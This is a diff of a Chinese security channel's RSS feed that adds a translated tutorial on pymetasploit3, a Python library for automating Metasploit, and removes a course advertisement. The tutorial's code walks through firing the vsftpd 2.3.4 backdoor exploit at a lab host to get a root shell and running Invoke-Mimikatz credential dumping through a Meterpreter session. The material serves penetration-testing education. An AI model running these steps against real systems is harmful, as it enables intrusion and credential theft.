@@ -5,7 +5,72 @@
 <link>https://henix.github.io/feeds/zhuanlan.twosecurity/</link>
 <description>培养黑客式思维: twosecurity.cn 培养黑客式思维: twosecurity.cn</description>
 <language>zh-cn</language>
-<lastBuildDate>Thu, 15 Aug 2019 11:02:59 +0800</lastBuildDate>
+<lastBuildDate>Thu, 15 Aug 2019 23:29:17 +0800</lastBuildDate>
+<item>
+<title>利用 Python3 来实现 Metasploit 自动化</title>
+<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-08-15-78328450.html</link>
+<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/78328450&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-58b34da2684e34eee543d8ad4d5da9e9_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;你是否每次渗透测试都有一个要执行的任务列表，例如，SSH 暴力破解或端口映射？又或者使用 Python 和 Metasploit 使它自动化！不幸的是，之前一直没有一个功能齐全的 Python 库来简化这些工作，直到今天……&lt;/p&gt;&lt;p&gt;Pymetasploit3建立在 allfro 的 pymetasploit 库之上。它使 Metasploit 自动化变得更加容易。由于 pymetasploit3 构建于 Python3 之上，因此您还可以获得 Python3 的 asyncio 库的强大功能并执行自动化任务。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bb1da345ca459b2539c7793d4919e474_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;700&quot; data-rawheight=&quot;400&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;700&quot; data-original=&quot;https://pic1.zhimg.com/v2-bb1da345ca459b2539c7793d4919e474_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bb1da345ca459b2539c7793d4919e474_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;700&quot; data-rawheight=&quot;400&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;700&quot; data-original=&quot;https://pic1.zhimg.com/v2-bb1da345ca459b2539c7793d4919e474_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-bb1da345ca459b2539c7793d4919e474_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;安装&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;mkdir your-new-project-directory 
+cd your-new-project-directory
+利用 Python3 来实现 Metasploit 自动化
+
+ pipenv install –three pyme tasploit3 
+pipenv shell&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;或者&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;pip install --user pyme tasploit3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;启动 Metasploit RPC server&lt;/b&gt;&lt;/p&gt;&lt;p&gt;执行 msfconsole 或者 msfrpcd&lt;/p&gt;&lt;p&gt;&lt;b&gt;Msfconsole&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ Msfconsole msf&amp;gt; load msgrpc Pass=你的密码&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;Msfrpcd&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ msfrpcd -P 你的密码&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;使用方法&lt;/b&gt;&lt;/p&gt;&lt;p&gt;准备好与 Metasploit 进行互动。 如果您要连接到 msfrpcd 服务，您需创建一个这样的RPC客户端：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; from pymetasploit3.msfrpc import * 
+&amp;gt;&amp;gt;&amp;gt; client = MsfRpcClient(‘你的密码&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;连接到 msfconsole RPC plugin:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; from pymetasploit3.msfrpc import * 
+&amp;gt;&amp;gt;&amp;gt; client = MsfRpcClient(&amp;#39;你的密码&amp;#39;, port=55553)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;RPC  client是库的核心，所有功能都直接来自这个对象。使用 dir() 可以很容易地查看 Python 库对象:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; [m for m in dir(client) if not m.startswith(&amp;#39;_&amp;#39;)]
+ &amp;gt;&amp;gt;&amp;gt; [&amp;#39;auth&amp;#39;, &amp;#39;authenticated&amp;#39;, &amp;#39;call&amp;#39;, &amp;#39;client&amp;#39;, &amp;#39;consoles&amp;#39;, &amp;#39;core&amp;#39;, &amp;#39;db&amp;#39;, &amp;#39;jobs&amp;#39;, &amp;#39;login&amp;#39;, &amp;#39;logout&amp;#39;, &amp;#39;modules&amp;#39;, &amp;#39;plugins&amp;#39;, &amp;#39;port&amp;#39;, &amp;#39;server&amp;#39;, &amp;#39;token&amp;#39;, &amp;#39;sessions&amp;#39;, &amp;#39;ssl&amp;#39;, &amp;#39;uri&amp;#39;] 
+&amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;让我们来看下 exploit 模块：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; client.modules.exploit
+[&amp;#39;windows/wins/ms04_045_wins&amp;#39;, &amp;#39;windows/winrm/winrm_sc ript_exec&amp;#39;, &amp;#39;windows/vpn/safenet_ike_11&amp;#39;,
+&amp;#39;windows/vnc/winvnc_http_get&amp;#39;, &amp;#39;windows/vnc/ultravnc_viewer_bof&amp;#39;, &amp;#39;windows/vnc/ultravnc_client&amp;#39;, ...
+&amp;#39;aix/rpc_ttdbserverd_realpath&amp;#39;, &amp;#39;aix/rpc_cmsd_opcode21&amp;#39;]
+&amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;创建一个 exploit 模块对象很简单。通过 client.modules.use() 传入模块类型以及模块名称。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; exploit = client.modules.use(&amp;#39;exploit&amp;#39;, &amp;#39;unix/ftp/vsftpd_234_backdoor&amp;#39;) &amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在我们设置模块选项。我们首先要看看哪些目标可用并设置合适的目标。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; exploit.targets
+ {0: &amp;#39;Automatic&amp;#39;}
+&amp;gt;&amp;gt;&amp;gt; 
+&amp;gt;&amp;gt;&amp;gt; exploit.default_target 
+0
+ &amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在这种情况下，只有一个目标，并且已经设置成默认的。您可以使用具有多个目标的漏洞，并设置它：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; exploit.target = 0 
+0
+ &amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;让我们找出这个目标的有效载荷：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; exploit.targetpayloads() 
+[&amp;#39;cmd/unix/interact&amp;#39;] 
+&amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;下一步是查看和设置模块选项。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; exploit.options
+ [&amp;#39;WORKSPACE&amp;#39;, &amp;#39;VERBOSE&amp;#39;, &amp;#39;WfsDelay&amp;#39;, &amp;#39;EnableContextEncoding&amp;#39;, &amp;#39;ContextInformationFile&amp;#39;, &amp;#39;DisablePayloadHandler&amp;#39;, &amp;#39;RHOSTS&amp;#39;, &amp;#39;RPORT&amp;#39;, &amp;#39;SSL&amp;#39;, &amp;#39;SSLVersion&amp;#39;, &amp;#39;SSLVerifyMode&amp;#39;, &amp;#39;SSLCipher&amp;#39;, &amp;#39;Proxies&amp;#39;, &amp;#39;CPORT&amp;#39;, &amp;#39;CHOST&amp;#39;, &amp;#39;ConnectTimeout&amp;#39;, &amp;#39;TCP::max_send_size&amp;#39;, &amp;#39;TCP::send_delay&amp;#39;]
+ &amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面大多数选项都已经设置好了默认值，但是我们如何知道哪些选项是必须要设置的，并且我们如何设置它们？&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; expoit.missing_required
+ [&amp;#39;RHOSTS&amp;#39;]
+ &amp;gt;&amp;gt;&amp;gt; exploit[‘RHOSTS’] = 192.168.1.2 
+&amp;gt;&amp;gt;&amp;gt; exploit.runoptions
+ {&amp;#39;VERBOSE&amp;#39;: False, &amp;#39;WfsDelay&amp;#39;: 0, &amp;#39;EnableContextEncoding&amp;#39;: False, &amp;#39;DisablePayloadHandler&amp;#39;: False, &amp;#39;RPORT&amp;#39;: 21, &amp;#39;SSL&amp;#39;: False, &amp;#39;SSLVersion&amp;#39;: &amp;#39;Auto&amp;#39;, &amp;#39;SSLVerifyMode&amp;#39;: &amp;#39;PEER&amp;#39;, &amp;#39;ConnectTimeout&amp;#39;: 10, &amp;#39;TCP::max_send_size&amp;#39;: 0, &amp;#39;TCP::send_delay&amp;#39;: 0, &amp;#39;RHOSTS&amp;#39;: &amp;#39;192.168.1.2&amp;#39;}
+ &amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们在上面的输出中可以看到我们成功地将 RHOSTS 设置为192.168.1.2。 现在我们准备通过在 Metasploit 控制台中运行漏洞来弹出 shell。 Metasploit 控制台是在使用命令 msfconsole 启动 Metasploit 时给出的提示，但如果您使用带有 msfrpcd 的 RPC 守护程序启动 Metasploit，也可以创建控制台。 下面，我们将创建一个新的控制台，获取其控制台 ID，并在该控制台内运行 exploit 模块，以便我们可以收集模块的输出。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; console_id = client.consoles.console().cid 
+&amp;gt;&amp;gt;&amp;gt; console = client.consoles.console(console_id) 
+&amp;gt;&amp;gt;&amp;gt; console.run_module_with_output(exploit, payload=’cmd/unix/interact’) 
+# Some time passes 
+&amp;#39;VERBOSE =&amp;gt; false\nWfsDelay =&amp;gt; 0 [...] [*] 192.168.1.2:21 - Banner: 220 vsFTPd 2.3.4\n[*] 192.168.1.2:21 - USER: 331 Please specify the password [...]&amp;#39;
+ &amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在我们有一个会话，我们与它进行交互。client.sessions.list 将返回一个字典，其中每个键都是会话标识符，并且会话数据将作为值存储。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; client.sessions.list 
+{&amp;#39;1&amp;#39;: {&amp;#39;info&amp;#39;: &amp;#39;&amp;#39;, &amp;#39;username&amp;#39;: &amp;#39;jsmith&amp;#39;, &amp;#39;session_port&amp;#39;: 21, &amp;#39;via_payload&amp;#39;: &amp;#39;payload/cmd/unix/interact&amp;#39;, &amp;#39;uuid&amp;#39;: &amp;#39;5orqnnyv&amp;#39;, &amp;#39;tunnel_local&amp;#39;: &amp;#39;172.16.14.1:58429&amp;#39;, &amp;#39;via_exploit&amp;#39;: &amp;#39;exploit/unix/ftp/vsftpd_234_backdoor&amp;#39;, &amp;#39;exploit_uuid&amp;#39;: &amp;#39;3whbuevf&amp;#39;, &amp;#39;tunnel_peer&amp;#39;: &amp;#39;192.168.1.2:6200&amp;#39;, &amp;#39;workspace&amp;#39;: &amp;#39;false&amp;#39;, &amp;#39;routes&amp;#39;: &amp;#39;&amp;#39;, &amp;#39;target_host&amp;#39;: &amp;#39;192.168.1.2&amp;#39;, &amp;#39;type&amp;#39;: &amp;#39;shell&amp;#39;, &amp;#39;session_host&amp;#39;: &amp;#39;192.168.1.2&amp;#39;, &amp;#39;desc&amp;#39;: &amp;#39;Command shell&amp;#39;}}
+ &amp;gt;&amp;gt;&amp;gt; shell = client.sessions.session(&amp;#39;1&amp;#39;) 
+&amp;gt;&amp;gt;&amp;gt; shell.write(&amp;#39;whoami&amp;#39;) 
+&amp;gt;&amp;gt;&amp;gt; shell.read() &amp;#39;\nroot&amp;#39; 
+&amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;假设您想在这个会话中运行一个命令，等待命令完成，并返回命令的输出。这在控制台中很简单，因为每个控制台会告诉您，它是否仍在运行您发送的最后一个命令。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; console.is_busy() 
+False 
+&amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不幸的是，会话没有来自 Metasploit 提供的 session 内置功能。有三种方法可以解决这个问题。方法一：等待从会话中读取任何数据并返回该数据。这对于一次性打印所有数据的系统命令非常有效。下面，我们将在远程会话上运行 arp 命令，并在接收到任何数据时立即返回。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; cmd = &amp;#39;arp&amp;#39; 
+&amp;gt;&amp;gt;&amp;gt; shell.run_with_output(cmd) 
+&amp;#39;\n Address                  HWtype  HWaddress           Flags Mask […]&amp;#39;
+ &amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;方法二是等待一段时间，然后在该时间之后返回所有数据。 需要注意的一个细节是，默认情况下，Metasploit 的通讯超时为300秒。 如果您希望运行一个耗时超过300秒的命令，则必须设置 Metasploit 通信超时以及 run_with_output() 的超时。 例如，要将 Meterpreter shell 的通信超时更改为500秒，请在 Meterpreter shell 中运行 set_timeouts -c 500。 下面示例中的 shell 仍然是我们在前面的示例中使用的相同的简单 Linux shell，所以没有必要这样做。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; cmd = &amp;#39;arp&amp;#39;
+ &amp;gt;&amp;gt;&amp;gt; shell.run_with_output(cmd, timeout=10s, timeout_exception=False) 
+# 10 seconds pass &amp;#39;\n Address                  HWtype  HWaddress           Flags Mask […]&amp;#39;
+ &amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;方法三是在找到某个字符串后停止收集数据。 对于非常复杂的命令，这通常是最一致的。 下面我们将查找字符串“Address”和“HWtype”，我们知道它存在于 Linux上 arp 命令的输出中。 在处理 Meterpreter 会话时，字符串“[ - ]”和“[+]”通常是很好的默认结束字符串，因为当命令完成或失败时，Metasploit 通常会在其输出中使用这些字符串。 但是 Metasploit 的输出在一个命令到下一个命令之间是不一致的，所以要谨慎选择一致的结束字符串，否则您可能会在稍后读取数据缓冲区并让前一个命令的输出扰乱您的新命令的输出。 只要在会话的输出中读取一个选定的结束字符串，就会返回到该时刻之前收集的所有数据。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; cmd = &amp;#39;arp&amp;#39; 
+&amp;gt;&amp;gt;&amp;gt; end_strs = [&amp;#39;Address&amp;#39;, &amp;#39;HWtype&amp;#39;] 
+&amp;gt;&amp;gt;&amp;gt; shell.run_with_output(cmd, end_strs=end_strs) 
+&amp;#39;\n Address                  HWtype  HWaddress           Flags Mask […]&amp;#39; 
+&amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;假设您在 Windows 主机上获得了 Meterpreter shell，您还可以运行 PowerShell 命令。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; met_shell = client.sessions.session(&amp;#39;2&amp;#39;) 
+&amp;gt;&amp;gt;&amp;gt; psh_sc ript = &amp;#39;/home/user/sc ripts/Invoke-Mimikatz.ps1&amp;#39; 
+&amp;gt;&amp;gt;&amp;gt; met_shell.import_psh(psh_sc ript) 
+&amp;gt;&amp;gt;&amp;gt; met_shell.run_psh_cmd(&amp;#39;Invoke-Mimikatz&amp;#39;)
+ # Some time passes &amp;#39;Mimikatz output…&amp;#39;
+ &amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;简单概述了一下 pymetasploit3 的基本功能，现在就用一个小 Python 脚本替代你的工具吧！&lt;/p&gt;&lt;p&gt;来源：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.coalfire.com/The-Coalfire-Blog/May-2019/pymetasploit3-Metasploit-Automation-Library&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;coalfire.com/The-Coalfi&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;re-Blog/May-2019/pymetasploit3-Metasploit-Automation-Library&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;</description>
+<author>二向箔安全</author>
+<guid isPermaLink="false">2019-08-15-78328450</guid>
+<pubDate>Thu, 15 Aug 2019 00:00:00 +0800</pubDate>
+</item>
 <item>
 <title>被盗的 iphone 是怎样被解锁的</title>
 <link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-08-14-78123742.html</link>
@@ -102,15 +167,6 @@ types:
 <author>二向箔安全</author>
 <guid isPermaLink="false">2019-08-04-76614754</guid>
 <pubDate>Sun, 04 Aug 2019 00:00:00 +0800</pubDate>
-</item>
-<item>
-<title>安全运维工程师，限时特价1000元！</title>
-<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-08-02-76408539.html</link>
-<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/76408539&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
-&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-35ae3963125b9f67b93b75dca4ab330c_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;《等保2.0》规定企业必备的安全运维人员&lt;/p&gt;&lt;p&gt;现在每月只要 89 就可以学到啦~&lt;/p&gt;&lt;p&gt;岗位月薪5k—9k&lt;/p&gt;&lt;p&gt;只要你敢想，我们就敢做！&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-2c9cde10e5bcde416735dc4ab2789b0d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;1920&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1080&quot; data-original=&quot;https://pic2.zhimg.com/v2-2c9cde10e5bcde416735dc4ab2789b0d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-2c9cde10e5bcde416735dc4ab2789b0d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;1920&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1080&quot; data-original=&quot;https://pic2.zhimg.com/v2-2c9cde10e5bcde416735dc4ab2789b0d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-2c9cde10e5bcde416735dc4ab2789b0d_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</description>
-<author>二向箔安全</author>
-<guid isPermaLink="false">2019-08-02-76408539</guid>
-<pubDate>Fri, 02 Aug 2019 00:00:00 +0800</pubDate>
 </item>
 </channel>
 </rss>
